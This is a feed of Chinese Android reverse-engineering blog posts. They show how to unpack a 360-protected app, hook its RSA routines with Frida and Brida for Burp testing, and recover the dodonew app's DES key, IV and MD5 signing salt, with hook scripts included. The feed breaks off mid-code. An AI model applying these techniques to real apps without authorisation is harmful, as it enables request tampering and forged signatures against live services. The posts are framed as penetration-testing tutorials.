        <content type="html"><![CDATA[<h2 id="Brida介绍"><a href="#Brida介绍" class="headerlink" title="Brida介绍"></a>Brida介绍</h2><ul><li>官方解释:Brida 是 Burp Suite 扩展，它作为 Burp Suite 和 Frida 之间的桥梁，可以在篡改应用程序与后端服务/服务器之间交换的流量的同时使用和操作应用程序自己的方法。它支持 Frida 支持的所有平台（Windows、macOS、Linux、iOS、Android 和 QNX）。<br/>https://github.com/federicodotta/Brida <br/>https://github.com/vichhika/Brida  <br/><p>自己理解:brida 可以直接和frida server配合 。brida通过frida server对app进行spwn或者attach。将brida的js脚本通过frida-server注入app内。然后通过RPC主动调用方式对请求明文进行自动加密或者自动解密。发送到服务器上。服务器收到请求。解密然后响应方式加密数据发送给brida。brida 通过主动调用接收直接对加密数据进行解密。从而达到自动化测试的目的。</p></li></ul><h2 id="Brida环境安装"><a href="#Brida环境安装" class="headerlink" title="Brida环境安装"></a>Brida环境安装</h2><ul><li>安装的环境参考https://www.bilibili.com/video/av332313470/   不在过多介绍。这里我用的python环境是python3</li></ul><h2 id="app进行分析"><a href="#app进行分析" class="headerlink" title="app进行分析"></a>app进行分析</h2><ul><li>使用jadx进行反编看看这个apk</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032006200.png" alt="看到qihoo绝对360加固"></p><li>360加固应该是整体加固。</li><li>脱整体加固的工具有frida-dexdump(python编写可以单独使用可以配合objection),blackDex(就是一个app直接安装就行了)。等工具我觉得这个两个工具最好用。工具百度或者github去搜索</li><li>这里我使用blackDex进行脱壳</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032014948.png" alt="选择目标app点击进行脱壳"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032014057.png" alt="脱壳成功"></p><li>利用adb pull命令拉下来。把打包的dex文件压缩成zip文件然后放到jadx里面即可</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032017012.png" alt="脱壳成功导入jdax里面"></p><li>接下来打开postern和Charles对软件进行抓包</li><li>刚打开手机发现提示root,我们通过截图可以看到是toast方法这是一个定位点</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032021125.png" alt="截图反应是toast标识"></p><li>然后我们点击账号登陆随便输入进行抓包。这个没有检测代理也没有检测vpn可以直接抓并且是http协议所以不存在什么证书双向验证等问题。开搞</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032026906.png" alt="划红色的就是我们的目标"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032028542.png" alt="请求和响应都加密"></p><li>我们看到有一个param=我们去源代码里面搜素一下发现都是关联的d.c.a.k.r.c 函数</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032033658.png" alt="搜素到不少"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032035608.png" alt="这个uc函数估计是就是加密解密逻辑"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032037359.png" alt="确定加密解密函数"></p><li>看代码是RSA的加密方式不过他这和普通的好像不太一样有一个b函数实现加密解密逻辑</li><li>核心加密算法代码如下:</li><li><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">d<span class="token punctuation">.</span>c<span class="token punctuation">.</span>a<span class="token punctuation">.</span>k</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>interfaces<span class="token punctuation">.</span></span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">InvalidKeySpecException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span><span class="token punctuation">;</span><span class="token comment">/* compiled from: U.java */</span><span class="token comment">/* loaded from: dex_.dex */</span><span class="token keyword">public</span> <span class="token keyword">class</span> u <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">RSAPublicKey</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">,</span> <span class="token class-name">InvalidKeySpecException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">)</span> <span class="token class-name">KeyFactory</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">generatePublic</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA/ECB/PKCS1Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">RSAPublicKey</span> a2 <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">d</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span><span class="token function">getModulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bitLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> unused<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            m<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token string">"解密字符串["</span> <span class="token operator">+</span> str <span class="token operator">+</span> <span class="token string">"]时遇到异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* JADX INFO: Access modifiers changed from: package-private */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA/ECB/PKCS1Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">RSAPublicKey</span> a2 <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span><span class="token function">d</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span><span class="token function">getModulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bitLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token string">"加密字符串["</span> <span class="token operator">+</span> str <span class="token operator">+</span> <span class="token string">"]时遇到异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">d</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span> cipher<span class="token punctuation">,</span> <span class="token keyword">int</span> i2<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">,</span> <span class="token keyword">int</span> i3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          核心算法 由于该app目前在运行阶段所以核心代码我就忽略了。           <span class="token keyword">return</span> byteArray<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li>仔细看加解密使用的都是同一个公钥。公钥我们用xxx进行代替。这种我是第一次见笑脸。</li></ul><h2 id="Frida-Hook脚本编写确定猜想"><a href="#Frida-Hook脚本编写确定猜想" class="headerlink" title="Frida Hook脚本编写确定猜想"></a>Frida Hook脚本编写确定猜想</h2><ul><li>编写frida脚本需要frida api基础java和JavaScript基础如果不懂建议去学习。这里不再讲述</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041430875.png" alt="firdahook脚本编写"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041433635.png" alt="hook效果说明脚本编写没有问题"></p><h2 id="使用博主编写算法通杀脚本快速定位"><a href="#使用博主编写算法通杀脚本快速定位" class="headerlink" title="使用博主编写算法通杀脚本快速定位"></a>使用博主编写算法通杀脚本快速定位</h2><ul><li>可以去频道下载(这个只能吐出明文并不能定位),直接定位的后续内部发布</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041701386.png" alt="通杀算法快速定位1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041702117.png" alt="通杀算法快速定位2"></p><h2 id="app加密通信过程"><a href="#app加密通信过程" class="headerlink" title="app加密通信过程"></a>app加密通信过程</h2><ul><li>1:app明文请求通过RSA/ECB/PKCS1Padding 非对称算法对明文请求加密</li><li>2:服务器收到加密请求使用秘钥对加密请求进行解密(注意这里public static String b) 对请求加密的数据无法解密因为是非对称的加密算法</li><li>3:把解密的数据在服务器里面顺序执行判断等。结果在加密然后发送(响应)给app客户端。</li><li>4:app客户端收到加密响应用自己的解密算法对响应进行解密</li></ul><h2 id="frida和brida和burp与app和服务器的关系解读"><a href="#frida和brida和burp与app和服务器的关系解读" class="headerlink" title="frida和brida和burp与app和服务器的关系解读"></a>frida和brida和burp与app和服务器的关系解读</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041459326.png" alt="图解说明关系"></p><h2 id="brida-主动调用js编写"><a href="#brida-主动调用js编写" class="headerlink" title="brida 主动调用js编写"></a>brida 主动调用js编写</h2><ul><li>编写frida脚本需要frida api基础java和JavaScript基础 Brida 编写脚本的基础 如果不懂建议去学习。这里不再讲述</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041502303.png" alt="brida Rpc脚本编写"></p><ul><li>测试是否生效</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041505150.png" alt="测试截图"></p><h2 id="brida-主动调用插件编写"><a href="#brida-主动调用插件编写" class="headerlink" title="brida 主动调用插件编写"></a>brida 主动调用插件编写</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041515403.png" alt="加密插件"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041518543.png" alt="解密插件"></p><h2 id="最终测试截图"><a href="#最终测试截图" class="headerlink" title="最终测试截图"></a>最终测试截图</h2><ul><li>此篇文章提供思路,具体有不会编写。插件自己思考一下。或者百度参考。涉及到的脚本和细节问题以后如果创建内部群会详细讲解。关注博主的频道和github主页。了解最新动态。至此我们可以把hook出的明文直接在repeteror中填写然后发送利用brida实现自动加密解密。测试app。不过这种需要依赖app不稳定可能。</li>  </ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041519346.png" alt="最终测试结果"></p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> Brida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java层自吐算法脚本-原创</title>
      <link href="/androidreverse/2023/02/articles/97121a1663073879/"/>
      <url>/androidreverse/2023/02/articles/97121a1663073879/</url>
      
        <content type="html"><![CDATA[<h1 id="frida-算法插件开发介绍"><a href="#frida-算法插件开发介绍" class="headerlink" title="frida 算法插件开发介绍"></a>frida 算法插件开发介绍</h1> <ul><li>现在的app逐渐重视起安全,把请求包和响应包采用进行加密。有的对数据进行sign签名校验。使我们抓到包也无法直接串改数据。另外app可能存在混淆或者是加固这使得我们利用反编译工具无法快速得到加密算法。就算是用的java层的api我们肉眼很难一下看出这个加密的方式所以写一个frida自吐算法的脚本变得尤为重要在安卓逆向当中。于是抽空开发出来一个Java层通杀算法脚本。脚本可能存在bug。有时间或者精力遇到在完善一下。</li></ul><h2 id="算法界面截图"><a href="#算法界面截图" class="headerlink" title="算法界面截图"></a>算法界面截图</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302182108012.png" alt="算法界面截图"></p><h2 id="frida演示"><a href="#frida演示" class="headerlink" title="frida演示"></a>frida演示</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302182119111.png" alt="frida演示"></p><h2 id="是否博主原创"><a href="#是否博主原创" class="headerlink" title="是否博主原创"></a>是否博主原创</h2><pre><code> <pre class="language-none"><code class="language-none">   是</code></pre></code></pre><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2>  <ul><li>下载地址:https://t.me/SoftwareUpdateChannel/72</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>app渗透测试请求包加密如何进行自动化测试</title>
      <link href="/androidreverse/2023/02/articles/ab0a8d0cab6627b4/"/>
      <url>/androidreverse/2023/02/articles/ab0a8d0cab6627b4/</url>
      
        <content type="html"><![CDATA[<h1 id="嘟嘟牛在线案例"><a href="#嘟嘟牛在线案例" class="headerlink" title="嘟嘟牛在线案例"></a>嘟嘟牛在线案例</h1><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2>  <ul><li>电脑usb真机连接手机界面如下</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131054823.png" alt="电脑usb真机连接"></p>  <ul><li>随便输入点击登录</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131051987.png" alt="随便输入点击登录"></p>  <ul><li>可能返回2,这里使用postern 和Charles 抓包。配置好postern代理</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131055974.png" alt="postern 和Charles"><br>    <ul><li>打开Charles进行抓包</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131055879.png" alt="Charles进行抓包"></p>  <pre class="language-抓包细节" data-language="抓包细节"><code class="language-抓包细节">POST &#x2F;api&#x2F;user&#x2F;login HTTP&#x2F;1.1If-Modified-Since: Sat, 11 Feb 2023 08:24:10 GMTContent-Type: application&#x2F;json; charset&#x3D;utf-8User-Agent: Dalvik&#x2F;2.1.0 (Linux; U; Android 10; Pixel Build&#x2F;QP1A.191005.007.A3)Host: api.dodovip.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 248&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\&#x2F;\&#x2F;FDsRnlBfgL4lcVxjXii\&#x2F;UNcdXYMk0EFbT8S8sTz7fW\n5ElmCRHm1SJQF76FKmSR9iSVviBXFx+vvRhLM14Q3LH+UIUx2DmyebXLy7V5vYDpFb5iABBQIvTu\nvGJ3s8vC3PVQwH6M+1oELCAimzf0qYiBzKfzU0Id4Rxf\&#x2F;FUJ+OJM5LbrL+rRwTMGBmTms2de\n&quot;&#125;响应包如下:HTTP&#x2F;1.1 200 OKDate: Sat, 11 Feb 2023 08:26:40 GMTContent-Type: application&#x2F;json;charset&#x3D;utf-8Transfer-Encoding: chunkedServer: NginxContent-Encoding: gzipConnection: keep-alive2v+DC2gq7Rs2vBLjHBwgrO0gyauGMTE6</code></pre><h2 id="使用工具查看是否是安卓控件开发的"><a href="#使用工具查看是否是安卓控件开发的" class="headerlink" title="使用工具查看是否是安卓控件开发的"></a>使用工具查看是否是安卓控件开发的</h2>  <ul><li>app 界面控件的查看 使用 uiautomatorviewer.bat是否是安卓开发的</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131056551.png" alt="uiautomatorviewer是否是安卓开发的"></p><h2 id="搜索请求包特征使用frida确定经过函数"><a href="#搜索请求包特征使用frida确定经过函数" class="headerlink" title="搜索请求包特征使用frida确定经过函数"></a>搜索请求包特征使用frida确定经过函数</h2>  <ul><li>我们使用jadx反编译一下看看</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131058522.png" alt="jadx反编译"><br>  <ul><li>包名是com.dodonew.online  来搜索请求包的特征搜索字符串 “Encrypt</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131058218.png" alt="含有Encrypt字符串"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131100328.png" alt="代码截图"><br>  <ul><li>搜索出有两个,确定到底是哪个使用frida来hook判断确定</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131100911.png" alt="frida hook判断"><br>  <ul><li>com.dodonew.online.http.JsonRequest  的这个方法是走的</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131101056.png" alt="确定加密流程1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131102689.png" alt="确定加密流程2"><br>  <ul><li>com.dodonew.online.http.JsonRequest    paraMap 这个登陆是不走的</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131103661.png" alt="确定不走这个流程"></p><h2 id="跟踪分析流程和加密算法"><a href="#跟踪分析流程和加密算法" class="headerlink" title="跟踪分析流程和加密算法"></a>跟踪分析流程和加密算法</h2>  <ul><li>就看第一个了代码如下</li></ul>  <pre class="language-java" data-language="java"><code class="language-java">  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addRequestMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> addMap<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> time <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>addMap <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>addMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>addMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"timeStamp"</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">RequestUtil</span><span class="token punctuation">.</span><span class="token function">paraMap</span><span class="token punctuation">(</span>addMap<span class="token punctuation">,</span> <span class="token class-name">Config</span><span class="token punctuation">.</span>BASE_APPEND<span class="token punctuation">,</span> <span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> encrypt <span class="token operator">=</span> <span class="token class-name">RequestUtil</span><span class="token punctuation">.</span><span class="token function">encodeDesMap</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>desKey<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>desIV<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key 65102933  iv  32028092</span><span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>obj<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Encrypt"</span><span class="token punctuation">,</span> encrypt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>mRequestBody <span class="token operator">=</span> obj <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> BASE_DES_IV <span class="token operator">=</span> <span class="token string">"32028092"</span><span class="token punctuation">;</span>  <span class="token comment">//字符串</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> BASE_DES_KEY <span class="token operator">=</span> <span class="token string">"65102933"</span> <span class="token comment">//字符串</span><span class="token keyword">this</span><span class="token punctuation">.</span>enCipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES/CBC/PKCS5Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>deCipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES/CBC/PKCS5Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre>    <ul><li>重点就是RequestUtil.encodeDesMap  </li></ul>    <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">  Java.perform(function () &#123; &#x2F;&#x2F;java层的hook代码var jsonRequest&#x3D; Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);console.log(&quot;test&quot;);jsonRequest.encodeDesMap.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation&#x3D;function (data,key,iv)&#123;console.log(data);return this.encodeDesMap(data,key,iv);&#125;&#125;);  </code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131104677.png" alt="重点流程截图"></p>  <ul><li>现在sgin是不知道怎么来的看看  sign值如下  </li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131105180.png" alt="sign加密流程"></p>  <ul><li>String checkCode = Utils.md5(builder.toString()).toUpperCase();    addMap.put("sign", checkCode);  </li></ul>  <h2 id="编写firda-hook代码"><a href="#编写firda-hook代码" class="headerlink" title="编写firda hook代码"></a>编写firda hook代码</h2><p>  hook代码</p>  <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">  Java.perform(function () &#123; &#x2F;&#x2F;java层的hook代码var Utils&#x3D; Java.use(&quot;com.dodonew.online.util.Utils&quot;);console.log(&quot;testaa&quot;);Utils.md5.implementation&#x3D;function (data)&#123;console.log(&quot;sign数据:&quot;+data);var md5&#x3D;this.md5(data);console.log(md5);return md5;&#125;var RequestUtil&#x3D; Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);console.log(&quot;test&quot;);RequestUtil.encodeDesMap.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation&#x3D;function (data,key,iv)&#123;console.log(&quot;要加密的数据:&quot;,data);var encodeData&#x3D; this.encodeDesMap(data,key,iv);console.log(encodeData);return encodeData;&#125;&#125;);  </code></pre><h2 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h2>  <ul><li>sign数据:equtype=ANDROID&loginImei=Androidnull&timeStamp=1676112935252&userPwd=111&username=111125563&key=sdlkjsdljf0j2fsjkde729eee7e7c53f220292712c686b94d要加密的数据: {"equtype":"ANDROID","loginImei":"Androidnull","sign":"DE729EEE7E7C53F220292712C686B94D","timeStamp":"1676112935252","userPwd":"111","username":"111125563"}NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii/UNcdXYMk0EHdbdwRDGADPvJlZMZqsYcRLgBo9ZcfD+QFQcNIEUonlHHkJ40A/3P/7z+jmJS0Tr3kaMU/y5tVOjyDyQIAskXC+ZknputIDnDC1V23cu2PAeGn/EnUn367Pj0cdcOVWQ1k+Rg4qybOMnYUVOLvG8SA==<p>总体流程是 </p><p>md5(equtype&#x3D;ANDROID&amp;loginImei&#x3D;Androidnull&amp;timeStamp&#x3D;1676112935252&amp;userPwd&#x3D;111&amp;username&#x3D;111125563&amp;key&#x3D;sdlkjsdljf0j2fsjk)  至于是不是标准的md5暂不看</p><p>然后在把数据变成json数据</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131108917.png" alt="加密流程截图"></p><pre class="language-分析代码" data-language="分析代码"><code class="language-分析代码">key是md5以后 弄成十六进制iv 是直接十六进制public static final String 